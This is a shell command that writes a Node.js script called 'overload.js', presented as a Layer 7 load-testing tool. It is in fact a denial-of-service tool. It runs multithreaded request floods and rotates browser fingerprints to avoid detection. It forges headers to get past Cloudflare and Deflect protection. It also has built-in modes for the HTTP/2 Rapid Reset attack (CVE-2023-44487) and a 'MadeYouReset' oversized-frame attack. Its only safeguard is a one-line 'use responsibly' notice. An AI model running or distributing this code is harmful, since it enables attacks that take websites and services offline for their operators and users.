rm overload.js
cat > overload.js << 'EOF'
#!/usr/bin/env node

const http = require('http');
const http2 = require('http2');
const https = require('https');
const tls = require('tls');
const { URL } = require('url');
const { performance } = require('perf_hooks');
const { EventEmitter } = require('events');
const { createHash, randomBytes } = require('crypto');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');

// Configuration and Constants
const CONFIG = {
    DEFAULT_CONCURRENT: 100,
    DEFAULT_DURATION: 30,
    DEFAULT_RATE: 10,
    MAX_WORKERS: os.cpus().length,
    USER_AGENTS: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
    ],
    TLS_CIPHERS: [
        "TLS_AES_256_GCM_SHA384",
        "TLS_AES_128_GCM_SHA256",
        "TLS_CHACHA20_POLY1305_SHA256",
        "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
        "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
        "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
    ],
    HEADERS_TO_ROTATE: [
        "Accept", "Accept-Language", "Accept-Encoding", "Cache-Control",
        "Sec-Fetch-Dest", "Sec-Fetch-Mode", "Sec-Fetch-Site"
    ]
};

// Statistics Tracker
class Statistics extends EventEmitter {
    constructor() {
        super();
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            bytesReceived: 0,
            bytesSent: 0,
            responseTimes: [],
            statusCodes: {},
            errors: {},
            startTime: null,
            endTime: null
        };
    }

    incrementRequest() {
        this.stats.totalRequests++;
    }

    incrementSuccess(statusCode, responseTime, bytesReceived) {
        this.stats.successfulRequests++;
        this.stats.bytesReceived += bytesReceived;
        this.stats.responseTimes.push(responseTime);
        this.stats.statusCodes[statusCode] = (this.stats.statusCodes[statusCode] || 0) + 1;
    }

    incrementFailure(error, bytesSent) {
        this.stats.failedRequests++;
        this.stats.bytesSent += bytesSent;
        const errorKey = error.message || error.toString();
        this.stats.errors[errorKey] = (this.stats.errors[errorKey] || 0) + 1;
    }

    getSummary() {
        const duration = this.stats.endTime ? this.stats.endTime - this.stats.startTime : 0;
        const avgResponseTime = this.stats.responseTimes.length > 0 
            ? this.stats.responseTimes.reduce((a, b) => a + b, 0) / this.stats.responseTimes.length 
            : 0;
        
        return {
            totalRequests: this.stats.totalRequests,
            successfulRequests: this.stats.successfulRequests,
            failedRequests: this.stats.failedRequests,
            successRate: this.stats.totalRequests > 0 
                ? (this.stats.successfulRequests / this.stats.totalRequests * 100).toFixed(2) + "%" 
                : "0%",
            avgResponseTime: avgResponseTime.toFixed(2) + " ms",
            throughput: duration > 0 
                ? (this.stats.totalRequests / (duration / 1000)).toFixed(2) + " req/s" 
                : "0 req/s",
            bytesReceived: this.formatBytes(this.stats.bytesReceived),
            bytesSent: this.formatBytes(this.stats.bytesSent),
            duration: duration.toFixed(2) + " s"
        };
    }

    formatBytes(bytes) {
        if (bytes === 0) return "0 Bytes";
        const k = 1024;
        const sizes = ["Bytes", "KB", "MB", "GB"];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i];
    }
}

// HTTP Client with Protocol Support
class HTTPClient {
    constructor(target, options = {}) {
        this.target = target;
        this.options = {
            protocol: "auto",
            userAgent: CONFIG.USER_AGENTS[Math.floor(Math.random() * CONFIG.USER_AGENTS.length)],
            tlsProfile: this.getRandomTLSProfile(),
            followRedirects: true,
            maxRedirects: 5,
            ...options
        };
        this.stats = new Statistics();
        this.workerId = options.workerId || "main";
    }

    getRandomTLSProfile() {
        const ciphers = CONFIG.TLS_CIPHERS.sort(() => Math.random() - 0.5);
        
        // Use numeric values directly to avoid undefined constants
        const SSL_OP_NO_SSLv3 = 0x02000000;
        const SSL_OP_NO_TLSv1 = 0x04000000;
        const SSL_OP_NO_TLSv1_1 = 0x08000000;
        
        return {
            ciphers: ciphers.join(":"),
            honorCipherOrder: true,
            secureOptions: SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };
    }

    generateRandomHeaders() {
        const headers = {
            "User-Agent": this.options.userAgent,
            "Accept": this.getRandomAcceptHeader(),
            "Accept-Language": this.getRandomAcceptLanguage(),
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1"
        };

        // Add bypass headers for Cloudflare
        if (this.options.bypassCloudflare) {
            headers["CF-IPCountry"] = "US";
            headers["CF-Ray"] = randomBytes(8).toString("hex");
            headers["CF-Visitor"] = '{"scheme":"https"}';
        }

        // Add Deflect bypass headers
        if (this.options.bypassDeflect) {
            headers["X-Forwarded-For"] = this.generateRandomIP();
            headers["X-Real-IP"] = this.generateRandomIP();
        }

        return headers;
    }

    getRandomAcceptHeader() {
        const accepts = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        ];
        return accepts[Math.floor(Math.random() * accepts.length)];
    }

    getRandomAcceptLanguage() {
        const langs = [
            "en-US,en;q=0.9",
            "en-GB,en;q=0.9",
            "en;q=0.9",
            "en-US,en;q=0.9,es;q=0.8"
        ];
        return langs[Math.floor(Math.random() * langs.length)];
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    }

    async makeRequest() {
        const startTime = performance.now();
        this.stats.incrementRequest();

        try {
            const url = new URL(this.target);
            const protocol = this.options.protocol === "auto" ? this.detectProtocol(url) : this.options.protocol;
            
            console.log(`[${this.workerId}] Making request to ${this.target} using ${protocol}`);
            
            let response;
            if (protocol === "http2") {
                response = await this.makeHTTP2Request(url);
            } else {
                response = await this.makeHTTP1Request(url);
            }

            const endTime = performance.now();
            const responseTime = endTime - startTime;
            
            this.stats.incrementSuccess(response.statusCode, responseTime, response.bytesReceived || 0);
            
            console.log(`[${this.workerId}] ✅ SUCCESS: ${response.statusCode} (${responseTime.toFixed(2)}ms)`);
            
            return {
                success: true,
                statusCode: response.statusCode,
                responseTime: responseTime,
                headers: response.headers
            };
        } catch (error) {
            const endTime = performance.now();
            const responseTime = endTime - startTime;
            
            this.stats.incrementFailure(error, 0);
            
            console.log(`[${this.workerId}] ❌ FAILED: ${error.message} (${responseTime.toFixed(2)}ms)`);
            
            return {
                success: false,
                error: error.message,
                responseTime: responseTime
            };
        }
    }

    async makeHTTP1Request(url) {
        return new Promise((resolve, reject) => {
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === "https:" ? 443 : 80),
                path: url.pathname + url.search,
                method: this.options.method || "GET",
                headers: this.generateRandomHeaders(),
                ...this.options.tlsProfile
            };

            const client = url.protocol === "https:" ? https : http;
            
            const req = client.request(options, (res) => {
                let data = [];
                let bytesReceived = 0;

                res.on("data", (chunk) => {
                    data.push(chunk);
                    bytesReceived += chunk.length;
                });

                res.on("end", () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        bytesReceived: bytesReceived
                    });
                });
            });

            req.on("error", reject);
            req.setTimeout(this.options.timeout || 30000, () => {
                req.destroy(new Error("Request timeout"));
            });

            if (this.options.body) {
                req.write(this.options.body);
            }
            req.end();
        });
    }

    async makeHTTP2Request(url) {
        return new Promise((resolve, reject) => {
            const client = http2.connect(url.origin, {
                ...this.options.tlsProfile,
                settings: {
                    enablePush: false,
                    initialWindowSize: 65535,
                    maxFrameSize: 16384
                }
            });

            client.on("error", reject);

            const headers = {
                ...this.generateRandomHeaders(),
                ":path": url.pathname + url.search,
                ":method": this.options.method || "GET",
                ":scheme": url.protocol.slice(0, -1),
                ":authority": url.hostname
            };

            const stream = client.request(headers);
            let bytesReceived = 0;

            stream.on("response", (responseHeaders) => {
                stream.on("data", (chunk) => {
                    bytesReceived += chunk.length;
                });

                stream.on("end", () => {
                    client.destroy();
                    resolve({
                        statusCode: responseHeaders[":status"],
                        headers: responseHeaders,
                        bytesReceived: bytesReceived
                    });
                });
            });

            stream.on("error", (error) => {
                client.destroy();
                reject(error);
            });

            if (this.options.body) {
                stream.write(this.options.body);
            }
            stream.end();
        });
    }

    async rapidResetAttack() {
        console.log(`[${this.workerId}] 🚀 Starting Rapid Reset Attack against ${this.target}`);
        
        const client = http2.connect(this.target, {
            ...this.options.tlsProfile,
            settings: {
                enablePush: false,
                maxConcurrentStreams: 1000
            }
        });

        const promises = [];
        const streamCount = 100;

        for (let i = 0; i < streamCount; i++) {
            const headers = {
                ...this.generateRandomHeaders(),
                ":path": "/",
                ":method": "GET",
                ":scheme": "https",
                ":authority": new URL(this.target).hostname
            };

            const stream = client.request(headers);
            
            // Immediately cancel the stream (Rapid Reset)
            setTimeout(() => {
                stream.close(http2.constants.NGHTTP2_CANCEL);
            }, Math.random() * 10);

            promises.push(new Promise((resolve) => {
                stream.on("close", () => resolve());
                stream.on("error", () => resolve());
            }));
        }

        await Promise.all(promises);
        client.destroy();
        console.log(`[${this.workerId}] ⚡ Rapid Reset Attack completed`);
    }

    async madeYouResetAttack() {
        console.log(`[${this.workerId}] 💥 Starting MadeYouReset Attack against ${this.target}`);
        
        const client = http2.connect(this.target, {
            ...this.options.tlsProfile,
            settings: {
                enablePush: false,
                maxFrameSize: 16384
            }
        });

        const headers = {
            ...this.generateRandomHeaders(),
            ":path": "/",
            ":method": "POST",
            ":scheme": "https",
            ":authority": new URL(this.target).hostname,
            "content-length": "1000000" // Oversized content length
        };

        const stream = client.request(headers);

        // Send oversized data frame
        const oversizedData = Buffer.alloc(1000000); // 1MB
        stream.write(oversizedData);

        stream.on("error", (error) => {
            client.destroy();
            this.stats.incrementFailure(error, oversizedData.length);
            console.log(`[${this.workerId}] 💥 MadeYouReset Attack triggered error: ${error.message}`);
        });

        stream.on("close", () => {
            client.destroy();
            console.log(`[${this.workerId}] 💥 MadeYouReset Attack completed`);
        });

        stream.end();
    }

    detectProtocol(url) {
        // Simple protocol detection - in production, you'd want more sophisticated detection
        if (url.protocol === "http:") return "http1";
        if (url.protocol === "https:") {
            // Try HTTP/2 first, fallback to HTTP/1.1
            return Math.random() > 0.5 ? "http2" : "http1";
        }
        return "http1";
    }
}

// Load Test Engine
class LoadTestEngine {
    constructor(target, options = {}) {
        this.target = target;
        this.options = {
            concurrent: CONFIG.DEFAULT_CONCURRENT,
            duration: CONFIG.DEFAULT_DURATION,
            rate: CONFIG.DEFAULT_RATE,
            mode: "standard",
            attack: null,
            bypassCloudflare: false,
            bypassDeflect: false,
            ...options
        };
        this.workers = [];
        this.stats = new Statistics();
        this.isRunning = false;
    }

    async start() {
        if (this.isRunning) {
            throw new Error("Load test is already running");
        }

        this.isRunning = true;
        this.stats.stats.startTime = performance.now();

        console.log(`\n🚀 Starting load test against ${this.target}`);
        console.log(`📊 Mode: ${this.options.mode}`);
        console.log(`🔢 Concurrent connections: ${this.options.concurrent}`);
        console.log(`⏱️  Duration: ${this.options.duration}s`);
        console.log(`📈 Rate: ${this.options.rate} req/s`);
        console.log(`⚡ Attack: ${this.options.attack || 'None'}`);
        console.log(`🛡️  Cloudflare Bypass: ${this.options.bypassCloudflare ? 'Enabled' : 'Disabled'}`);
        console.log(`🛡️  Deflect Bypass: ${this.options.bypassDeflect ? 'Enabled' : 'Disabled'}`);
        console.log(`\n${'='.repeat(60)}\n`);

        // Start monitoring
        this.startMonitoring();

        // Create workers
        const workerCount = Math.min(this.options.concurrent, CONFIG.MAX_WORKERS);
        const connectionsPerWorker = Math.ceil(this.options.concurrent / workerCount);

        for (let i = 0; i < workerCount; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    target: this.target,
                    options: {
                        ...this.options,
                        concurrent: connectionsPerWorker,
                        workerId: `Worker-${i+1}`
                    },
                    isWorker: true
                }
            });

            worker.on("message", (message) => {
                if (message.type === "stats") {
                    this.updateStats(message.data);
                }
            });

            worker.on("error", (error) => {
                console.error(`❌ Worker error: ${error.message}`);
            });

            this.workers.push(worker);
        }

        // Stop after duration
        setTimeout(() => {
            this.stop();
        }, this.options.duration * 1000);
    }

    stop() {
        if (!this.isRunning) return;

        this.isRunning = false;
        this.stats.stats.endTime = performance.now();

        // Terminate workers
        this.workers.forEach(worker => worker.terminate());
        this.workers = [];

        console.log(`\n${'='.repeat(60)}`);
        console.log(`✅ Load test completed`);
        console.log(`📊 Final Statistics:`);
        console.log(JSON.stringify(this.stats.getSummary(), null, 2));
    }

    startMonitoring() {
        const interval = setInterval(() => {
            if (!this.isRunning) {
                clearInterval(interval);
                return;
            }

            const summary = this.stats.getSummary();
            process.stdout.write(`\r🔄 Requests: ${summary.totalRequests} | ✅ Success: ${summary.successfulRequests} | ❌ Failed: ${summary.failedRequests} | 📈 Rate: ${summary.throughput}`);
        }, 1000);
    }

    updateStats(workerStats) {
        // Merge worker statistics
        this.stats.stats.totalRequests += workerStats.totalRequests;
        this.stats.stats.successfulRequests += workerStats.successfulRequests;
        this.stats.stats.failedRequests += workerStats.failedRequests;
        this.stats.stats.bytesReceived += workerStats.bytesReceived;
        this.stats.stats.bytesSent += workerStats.bytesSent;
        this.stats.stats.responseTimes.push(...workerStats.responseTimes);
        
        // Merge status codes
        for (const [code, count] of Object.entries(workerStats.statusCodes)) {
            this.stats.stats.statusCodes[code] = (this.stats.stats.statusCodes[code] || 0) + count;
        }
        
        // Merge errors
        for (const [error, count] of Object.entries(workerStats.errors)) {
            this.stats.stats.errors[error] = (this.stats.stats.errors[error] || 0) + count;
        }
    }
}

// Worker Thread Logic
if (!isMainThread && workerData?.isWorker) {
    const { target, options } = workerData;
    const client = new HTTPClient(target, options);
    
    async function workerLoop() {
        const delay = 1000 / options.rate;
        
        while (true) {
            try {
                if (options.attack === "rapid-reset") {
                    await client.rapidResetAttack();
                } else if (options.attack === "madeyoureset") {
                    await client.madeYouResetAttack();
                } else {
                    await client.makeRequest();
                }
                
                // Adaptive delay
                const actualDelay = delay + (Math.random() * 100 - 50);
                await new Promise(resolve => setTimeout(resolve, actualDelay));
            } catch (error) {
                console.error(`[${options.workerId}] 🔥 Loop error: ${error.message}`);
                // Continue on error
            }
        }
    }
    
    workerLoop().catch(console.error);
}

// CLI Interface
function parseArgs() {
    const args = process.argv.slice(2);
    const options = {};
    
    for (let i = 0; i < args.length; i++) {
        const arg = args[i];
        
        switch (arg) {
            case "--url":
                options.url = args[++i];
                break;
            case "--concurrent":
                options.concurrent = parseInt(args[++i]);
                break;
            case "--duration":
                options.duration = parseInt(args[++i]);
                break;
            case "--rate":
                options.rate = parseInt(args[++i]);
                break;
            case "--mode":
                options.mode = args[++i];
                break;
            case "--attack":
                options.attack = args[++i];
                break;
            case "--bypass-cloudflare":
                options.bypassCloudflare = true;
                break;
            case "--bypass-deflect":
                options.bypassDeflect = true;
                break;
            case "--help":
                showHelp();
                process.exit(0);
        }
    }
    
    return options;
}

function showHelp() {
    console.log(`
OVERLOAD - Advanced Layer 7 Load Testing Tool

USAGE:
    node overload.js [OPTIONS]

OPTIONS:
    --url URL                    Target URL to test
    --concurrent NUMBER          Number of concurrent connections (default: 100)
    --duration SECONDS           Test duration in seconds (default: 30)
    --rate NUMBER                Requests per second per connection (default: 10)
    --mode MODE                  Test mode: standard, aggressive (default: standard)
    --attack TYPE                Attack type: rapid-reset, madeyoureset
    --bypass-cloudflare          Enable Cloudflare bypass techniques
    --bypass-deflect             Enable Deflect bypass techniques
    --help                       Show this help message

EXAMPLES:
    # Standard load test
    node overload.js --url https://example.com --concurrent 50 --duration 60

    # HTTP/2 Rapid Reset Attack
    node overload.js --url https://example.com --attack rapid-reset --concurrent 100

    # MadeYouReset Attack with bypass
    node overload.js --url https://example.com --attack madeyoureset --bypass-cloudflare

ATTACK MODES:
    rapid-reset     CVE-2023-44487 - Rapidly open and cancel HTTP/2 streams
    madeyoureset    CVE-2025-54500 - Send oversized HTTP/2 data frames

NOTE: Use this tool responsibly and only on systems you own or have permission to test.
    `);
}

// Main Execution
if (isMainThread) {
    const args = parseArgs();
    
    if (!args.url) {
        console.error("❌ Error: Target URL is required");
        showHelp();
        process.exit(1);
    }
    
    try {
        const engine = new LoadTestEngine(args.url, args);
        engine.start();
        
        // Handle graceful shutdown
        process.on("SIGINT", () => {
            console.log("\n\n🛑 Received SIGINT, stopping test...");
            engine.stop();
            process.exit(0);
        });
        
        process.on("SIGTERM", () => {
            console.log("\n\n🛑 Received SIGTERM, stopping test...");
            engine.stop();
            process.exit(0);
        });
    } catch (error) {
        console.error(`❌ Error: ${error.message}`);
        process.exit(1);
    }
}

module.exports = { HTTPClient, LoadTestEngine, Statistics };
EOF
